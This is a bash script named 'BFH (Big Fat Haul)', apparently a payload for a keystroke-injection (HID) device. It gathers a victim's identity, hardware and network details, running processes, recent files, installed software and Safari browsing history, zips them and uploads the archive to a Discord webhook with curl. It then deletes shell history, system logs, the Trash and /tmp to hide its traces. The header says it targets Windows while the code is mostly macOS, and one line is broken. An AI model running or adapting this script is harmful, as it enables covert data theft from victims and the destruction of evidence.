#!/bin/bash
###################################
#                                  
# Title        : BFH (Big Fat Haul)        
# Author       : Bar0r   
# Version      : 1.0              
# Category     : Exfil-Recon             
# Target       : Windows 10,11     
# Mode         : HID                     

# Check if a webhook URL is provided as an argument
if [ -z "$1" ]; then
  echo "Usage: $0 <Discord Webhook URL>"
  exit 1
fi

# Set the dc variable to the first argument (webhook URL)
dc="$1"

# Function to run a command and skip if it fails
run_command() {
    "$@" || echo "Skipped: $* (requires elevated permissions)"
}

############################################################################################################################################################

FolderName="$USER-LOOT-$(date +%Y-%m-%d_%H-%M)"
FileName="$FolderName.txt"
ZIP="$FolderName.zip"

mkdir -p /tmp/$FolderName

fullName=$(id -F)

# Hardware data
computerName=$(scutil --get ComputerName)
computerModel=$(sysctl -n hw.model)
osVersion=$(sw_vers)
cpu=$(sysctl -n machdep.cpu.brand_string)
ram=$(sysctl hw.memsize | awk '{print $1/1073741824 " GB"}')
disk=$(df -h / | grep '/dev/' | awk '{print "Disk: "$2", Free: "$4}')

#Network data
localIP=$(ifconfig | grep 'inet ' | grep -v 127.0.0.1 | awk '{print $2}')
mac=$(ifconfig en0 | awk '/ether/{print $2}')
publicIP=$(curl -s ifconfig.me)

#Processes and services
processes=$(ps aux)
services=$(launchctl list)

#recent files
recentFiles=$(find ~ -type f -printf '%T@ %p\n' 2>/dev/null | sort -n | tail -n 50)

#Installed software
software=$(ls /Applications)

############################################################################################################################################################


output="Full Name: $fullName
Computer Name: $computerName
Model: $computerModel
OS Version: $osVersion
CPU: $cpu
RAM: $ram
Disk: $disk
Public IP: $publicIP
Local IP: $localIP
MAC: $mac
Processes: $processes
Services: $services
Recent Files: $recentFiles
Installed Software: $software
"

echo "$output" > /tmp/$FolderName/computerData.txt

############################################################################################################################################################




sqlite3 ~/Library/Safari/History.db 'select visit_time,title from history_visits order by visit_time desc;' \
    | while read i; do d="${i%%.*}"; echo "$(date -r $((d+978307200))) | ${i#*|}"; done \
    | head -n 100 >> $env:TMP/$FolderName/BrowserData.txt






############################################################################################################################################################

#Compress

zip -r "/tmp/$ZIP" "/tmp/$FolderName"

#Upload to Discord
Upload_Discord() {
    local file="$1"
    local text="$2"
    local hookurl="$dc"

    # Post text message to Discord webhook
    if [[ ! -z "$text" ]]; then
        curl -H "Content-Type: application/json" \
             -X POST \
             -d "{\"username\": \"$USER\", \"content\": \"$text\"}" \
             "$hookurl"
    fi

    # Upload file to Discord webhook
    if [[ ! -z "$file" ]]; then
        curl -F "file=@$file" "$hookurl"
    fi
}

Upload_Discord "/tmp/$ZIP"


############################################################################################################################################################


#Delete tracks

#!/bin/bash



# Delete Terminal history
run_command history -c
run_command rm -f ~/.bash_history  # For Bash
run_command rm -f ~/.zsh_history   # For Zsh (if using zsh as the shell)

# Clear Spotlight run box history (macOS doesn't have an equivalent "Run box", but clearing the Spotlight index can be similar in effect)
run_command sudo mdutil -i off /
run_command sudo mdutil -E /
run_command sudo mdutil -i on /

# Clear system log files
run_command sudo rm -rf /var/log/*

# Clear contents of the Trash (Recycle Bin equivalent)
run_command rm -rf ~/.Trash/*

# Delete contents of the Temp folder (typically /tmp in macOS)
run_command rm -rf /tmp/*
















